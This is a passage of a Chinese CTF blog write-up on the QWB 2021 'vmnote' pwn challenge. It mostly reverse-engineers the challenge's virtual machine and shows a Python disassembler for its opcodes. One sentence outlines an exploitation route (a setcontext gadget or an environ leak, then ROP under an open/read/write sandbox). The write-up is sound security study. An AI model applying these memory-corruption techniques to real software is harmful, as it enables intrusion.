<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>qwb2021_vmnote | Lingze&#39;s blog</title>
    <meta name="generator" content="VuePress 1.8.0">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="ctfer">
    <meta name="keywords" content="ctfer">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.415d0a97.css" as="style"><link rel="preload" href="/assets/js/app.01f8cc77.js" as="script"><link rel="preload" href="/assets/js/2.5ece5099.js" as="script"><link rel="preload" href="/assets/js/38.c6a43a23.js" as="script"><link rel="prefetch" href="/assets/js/10.f923d8b8.js"><link rel="prefetch" href="/assets/js/100.cf64d3e9.js"><link rel="prefetch" href="/assets/js/11.19955ff8.js"><link rel="prefetch" href="/assets/js/12.e16d4c4d.js"><link rel="prefetch" href="/assets/js/13.0552f541.js"><link rel="prefetch" href="/assets/js/14.78d67d73.js"><link rel="prefetch" href="/assets/js/15.d342dfc4.js"><link rel="prefetch" href="/assets/js/16.36f247d6.js"><link rel="prefetch" href="/assets/js/17.031ae63f.js"><link rel="prefetch" href="/assets/js/18.7c49a89e.js"><link rel="prefetch" href="/assets/js/19.2d69c943.js"><link rel="prefetch" href="/assets/js/20.e845eb34.js"><link rel="prefetch" href="/assets/js/21.e398898d.js"><link rel="prefetch" href="/assets/js/22.6efd51e5.js"><link rel="prefetch" href="/assets/js/23.21d2b263.js"><link rel="prefetch" href="/assets/js/24.3231fe48.js"><link rel="prefetch" href="/assets/js/25.26e66a19.js"><link rel="prefetch" href="/assets/js/26.ddde99c2.js"><link rel="prefetch" href="/assets/js/27.f8e523dc.js"><link rel="prefetch" href="/assets/js/28.2c1ddb1d.js"><link rel="prefetch" href="/assets/js/29.f15cca3e.js"><link rel="prefetch" href="/assets/js/3.c087139c.js"><link rel="prefetch" href="/assets/js/30.2d433b5b.js"><link rel="prefetch" href="/assets/js/31.87dbaed0.js"><link rel="prefetch" href="/assets/js/32.045dc002.js"><link rel="prefetch" href="/assets/js/33.db01bde8.js"><link rel="prefetch" href="/assets/js/34.d177d280.js"><link rel="prefetch" href="/assets/js/35.360c2104.js"><link rel="prefetch" href="/assets/js/36.afbabc8a.js"><link rel="prefetch" href="/assets/js/37.8e60e299.js"><link rel="prefetch" href="/assets/js/39.08102dc6.js"><link rel="prefetch" href="/assets/js/4.28fb810e.js"><link rel="prefetch" href="/assets/js/40.5767c7d7.js"><link rel="prefetch" href="/assets/js/41.307bcf10.js"><link rel="prefetch" href="/assets/js/42.daf03989.js"><link rel="prefetch" href="/assets/js/43.952d68dc.js"><link rel="prefetch" href="/assets/js/44.cbeef42b.js"><link rel="prefetch" href="/assets/js/45.fbd2a9f2.js"><link rel="prefetch" href="/assets/js/46.a92ae456.js"><link rel="prefetch" href="/assets/js/47.24f82953.js"><link rel="prefetch" href="/assets/js/48.fa3498f4.js"><link rel="prefetch" href="/assets/js/49.a64774f2.js"><link rel="prefetch" href="/assets/js/5.0660e0b3.js"><link rel="prefetch" href="/assets/js/50.d0ed88cd.js"><link rel="prefetch" href="/assets/js/51.50727b96.js"><link rel="prefetch" href="/assets/js/52.2756affe.js"><link rel="prefetch" href="/assets/js/53.2739f473.js"><link rel="prefetch" href="/assets/js/54.f0b71120.js"><link rel="prefetch" href="/assets/js/55.94d5a5ee.js"><link rel="prefetch" href="/assets/js/56.637c3b4a.js"><link rel="prefetch" href="/assets/js/57.7b7e3fee.js"><link rel="prefetch" href="/assets/js/58.812bae5d.js"><link rel="prefetch" href="/assets/js/59.70fe1d63.js"><link rel="prefetch" href="/assets/js/6.c52e1544.js"><link rel="prefetch" href="/assets/js/60.0e6a01d3.js"><link rel="prefetch" href="/assets/js/61.702e5198.js"><link rel="prefetch" href="/assets/js/62.38f55e44.js"><link rel="prefetch" href="/assets/js/63.b505c9de.js"><link rel="prefetch" href="/assets/js/64.5489c9d8.js"><link rel="prefetch" href="/assets/js/65.3db6e034.js"><link rel="prefetch" href="/assets/js/66.3605a461.js"><link rel="prefetch" href="/assets/js/67.00d97ed9.js"><link rel="prefetch" href="/assets/js/68.78ef741a.js"><link rel="prefetch" href="/assets/js/69.808ca1f4.js"><link rel="prefetch" href="/assets/js/7.9920c8ea.js"><link rel="prefetch" href="/assets/js/70.15347f58.js"><link rel="prefetch" href="/assets/js/71.b9acfd65.js"><link rel="prefetch" href="/assets/js/72.7e1140f3.js"><link rel="prefetch" href="/assets/js/73.874f0e99.js"><link rel="prefetch" href="/assets/js/74.117bb7d4.js"><link rel="prefetch" href="/assets/js/75.964e2dfe.js"><link rel="prefetch" href="/assets/js/76.2df26afd.js"><link rel="prefetch" href="/assets/js/77.93ebe7b7.js"><link rel="prefetch" href="/assets/js/78.67c6c9bb.js"><link rel="prefetch" href="/assets/js/79.0d846438.js"><link rel="prefetch" href="/assets/js/8.f3c32733.js"><link rel="prefetch" href="/assets/js/80.4716a5b6.js"><link rel="prefetch" href="/assets/js/81.d8c3b2d2.js"><link rel="prefetch" href="/assets/js/82.ea63e06a.js"><link rel="prefetch" href="/assets/js/83.4d1ef8ae.js"><link rel="prefetch" href="/assets/js/84.32a22fe7.js"><link rel="prefetch" href="/assets/js/85.7fb3f862.js"><link rel="prefetch" href="/assets/js/86.4d386fc9.js"><link rel="prefetch" href="/assets/js/87.a095878a.js"><link rel="prefetch" href="/assets/js/88.69d77356.js"><link rel="prefetch" href="/assets/js/89.21ebadb4.js"><link rel="prefetch" href="/assets/js/9.d8b27656.js"><link rel="prefetch" href="/assets/js/90.d49929b7.js"><link rel="prefetch" href="/assets/js/91.cc956227.js"><link rel="prefetch" href="/assets/js/92.b72e3535.js"><link rel="prefetch" href="/assets/js/93.a76f52a2.js"><link rel="prefetch" href="/assets/js/94.82a77dbd.js"><link rel="prefetch" href="/assets/js/95.b0cec47e.js"><link rel="prefetch" href="/assets/js/96.87307703.js"><link rel="prefetch" href="/assets/js/97.c731aa62.js"><link rel="prefetch" href="/assets/js/98.1e36c988.js"><link rel="prefetch" href="/assets/js/99.914f1e07.js">
    <link rel="stylesheet" href="/assets/css/0.styles.415d0a97.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open no-sidebar have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Lingze's blog" class="logo"> <span class="site-name can-hide">Lingze's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/avatar2.jpg"> <div class="blogger-info"><h3>lingze</h3> <span>bin不是垃圾桶的意思!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav>  <!----> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-1baff76c><div class="articleInfo" data-v-1baff76c><ul class="breadcrumbs" data-v-1baff76c><li data-v-1baff76c><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1baff76c></a></li> <li data-v-1baff76c><a href="/categories/?category=ctf_wp" title="分类" data-v-1baff76c>ctf_wp</a></li><li data-v-1baff76c><a href="/categories/?category=qwb" title="分类" data-v-1baff76c>qwb</a></li></ul> <div class="info" data-v-1baff76c><div title="作者" class="author iconfont icon-touxiang" data-v-1baff76c><a href="https://github.com/wlingze" target="_blank" title="作者" class="beLink" data-v-1baff76c>lingze</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1baff76c><a href="javascript:;" data-v-1baff76c>2021-07-28</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">qwb2021_vmnote<!----></h1> <!----> <div class="theme-vdoing-content content__default"><h1 id="qwb2021-vmnote"><a href="#qwb2021-vmnote" class="header-anchor">#</a> qwb2021 vmnote</h1> <p></p><div class="table-of-contents"><ul><li><a href="#逆向">逆向</a><ul><li><a href="#vmnote逆向">vmnote逆向</a></li><li><a href="#反汇编脚本">反汇编脚本</a></li><li><a href="#vm重编译">vm重编译</a></li><li><a href="#note-bin逆向">note.bin逆向</a></li><li><a href="#堆部分">堆部分</a></li></ul></li><li><a href="#利用">利用</a><ul><li><a href="#漏洞">漏洞</a></li><li><a href="#vm-rop">vm rop</a></li><li><a href="#堆部分">堆部分</a></li></ul></li></ul></div><p></p> <p>其实去年暑假左右开始出现vm pwn题目, 简单逆向然后写opocode的, 去年国赛的时候出题就想做个vm内的rop的题目的思路, 但是后面划水挺久, 一直也就是个想法而已,这次在别人手里看到这么一个题目, 确实有趣. 膜出题师傅和赛时直接<a href="https://github.com/P4nda0s/qwb_vmnote_recompiler" target="_blank" rel="noopener noreferrer">重编译逆完了<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>的队友,</p> <h2 id="逆向"><a href="#逆向" class="header-anchor">#</a> 逆向</h2> <h3 id="vmnote逆向"><a href="#vmnote逆向" class="header-anchor">#</a> vmnote逆向</h3> <p>main函数进去比较简单, 也就不多赘述了, 直接进入下层函数,</p> <p><img src="https://i.loli.net/2021/07/28/YX4grQSzfyaWl9w.png" alt="image-20210728195214178"></p> <p><code>init_mem</code>中基本都是赋值为0的初始化, 其实也看不出啥,</p> <p><code>vm_init</code>函数是读取文件并载入到内存中, 其中还设置了沙盒, 只允许open read write, 而且题目libc是2.31,可以找gadget使用setcontext, 也可以打印environ泄漏堆地址直接写rop,</p> <p>然后在<code>vm_run</code>函数中就是运行虚拟机, 修一下跳转表,</p> <p>从opcode数组内取出opcode 以后取低五位指示对应的handler, 在某些指令中高三位用来判断数据大小, 然后程序内有以下数据</p> <p>其中reg表示的是对应的寄存器, 在程序中经常出现类似数据的按照索引在这个数组取值, 其实是对应寄存器, 其中pc sp等单独列出来, 但是同样可以用reg[idx]索引到,</p> <p>eflag是程序中存在判断修改eflag寄存器和后续通过eflag寄存器判断条件跳转,</p> <p>程序内有栈, 但是只是用来储存数据等,</p> <p>实现了函数调用, 基于栈运算, 还有模拟x86的栈帧,</p> <p><img src="https://i.loli.net/2021/07/29/U6OXpug7canhqoB.png" alt="image-20210729100247922"></p> <p>简单说下vm的处理, 因为正好是模拟x86的指令, 于是写一个可以将其翻译为x86指令集, 然后重编译.</p> <h3 id="反汇编脚本"><a href="#反汇编脚本" class="header-anchor">#</a> 反汇编脚本</h3> <p>肯定是基于python写, 然后开头模仿vmnote程序本身, 按照note.bin文件的格式读取文件,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">vmnote</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>regs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;rdi&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rsi&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rdx&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rcx&quot;</span><span class="token punctuation">,</span>  <span class="token string">&quot;r8&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r9&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r10&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r11&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r12&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;r13&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r14&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rbp&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rsp&quot;</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>set_opcode<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>handlers_init<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>eflag <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>asmcode <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

    <span class="token keyword">def</span> <span class="token function">set_opcode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>opcode_size <span class="token operator">=</span> u32<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        data_size <span class="token operator">=</span> u32<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>pc <span class="token operator">=</span> u32<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>pdata <span class="token operator">=</span> u32<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>opcode <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>self<span class="token punctuation">.</span>opcode_size<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>data_size<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>然后switch语句我选择用字典实现:</p> <blockquote><p>当然, 最开始是写了个代码生成出来的字符串, 后面一点点确定各个handler是干啥的, 当然也可以看到, 有的handler没有用到, 也就没去分析.</p></blockquote> <div class="language-python line-numbers-mode"><pre class="language-python"><code>
    <span class="token keyword">def</span> <span class="token function">disasm</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>is_run <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>pc <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>opcode_size<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>is_run<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            var <span class="token operator">=</span> self<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span><span class="token punctuation">)</span>
            op <span class="token operator">=</span> var <span class="token operator">&amp;</span> <span class="token number">0x1f</span>
            flag <span class="token operator">=</span> <span class="token punctuation">(</span>var <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">7</span>

            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;_{:04x}:\t&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>pc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&gt;</span> <span class="token number">0x1d</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;no! op &gt; 0x1d&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>op<span class="token punctuation">]</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handlers_init</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>handlers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token number">0x00</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>push<span class="token punctuation">,</span>
            <span class="token number">0x01</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>mov_ptr<span class="token punctuation">,</span>
            <span class="token number">0x02</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler02<span class="token punctuation">,</span>
            <span class="token number">0x03</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token punctuation">,</span>
            <span class="token number">0x04</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>leave<span class="token punctuation">,</span>
            <span class="token number">0x05</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>sub<span class="token punctuation">,</span>
            <span class="token number">0x06</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler06<span class="token punctuation">,</span>
            <span class="token number">0x07</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>add<span class="token punctuation">,</span>
            <span class="token number">0x08</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler08<span class="token punctuation">,</span>
            <span class="token number">0x09</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>mov_store<span class="token punctuation">,</span>
            <span class="token number">0x0a</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler0a<span class="token punctuation">,</span>
            <span class="token number">0x0b</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span><span class="token builtin">cmp</span><span class="token punctuation">,</span>
            <span class="token number">0x0c</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>exit<span class="token punctuation">,</span>
            <span class="token number">0x0d</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>andd<span class="token punctuation">,</span>
            <span class="token number">0x0e</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler0e<span class="token punctuation">,</span>
            <span class="token number">0x0f</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler0f<span class="token punctuation">,</span>
            <span class="token number">0x10</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler10<span class="token punctuation">,</span>
            <span class="token number">0x11</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>call<span class="token punctuation">,</span>
            <span class="token number">0x12</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>inc<span class="token punctuation">,</span>
            <span class="token number">0x13</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>jmp<span class="token punctuation">,</span>
            <span class="token number">0x14</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>
            <span class="token number">0x15</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler15<span class="token punctuation">,</span>
            <span class="token number">0x16</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>mov1<span class="token punctuation">,</span>
            <span class="token number">0x17</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">,</span>
            <span class="token number">0x18</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>ret<span class="token punctuation">,</span>
            <span class="token number">0x19</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>syscall<span class="token punctuation">,</span>
            <span class="token number">0x1a</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>handler1a<span class="token punctuation">,</span>
            <span class="token number">0x1b</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>test<span class="token punctuation">,</span>
            <span class="token number">0x1c</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>mul<span class="token punctuation">,</span>
            <span class="token number">0x1d</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>xor<span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br></div></div><p>简单说下分析的过程:</p> <p>最开始看到的是handler00, 也正好是第一个, 简单可以分析出来是push,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token keyword">def</span> <span class="token function">get_reg</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>regs<span class="token punctuation">[</span>self<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	<span class="token comment"># push</span>
    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot; push {}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>然后是mov, 比较特殊的是前面提到了的, 高三位会作为falg位, 标识取出数据的大小, 这里在<code>self.fetch</code>上也增加了这个标识位, 并默认为byte类型,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token comment"># mov reg, {number/reg}</span>
    <span class="token keyword">def</span> <span class="token function">mov1</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
            reg <span class="token operator">=</span> self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span>
            number <span class="token operator">=</span> self<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;mov {}, 0x{:08x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> number<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            reg1 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span>
            reg2 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;mov {}, {}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reg1<span class="token punctuation">,</span> reg2<span class="token punctuation">)</span>


    <span class="token keyword">def</span> <span class="token function">fetch</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
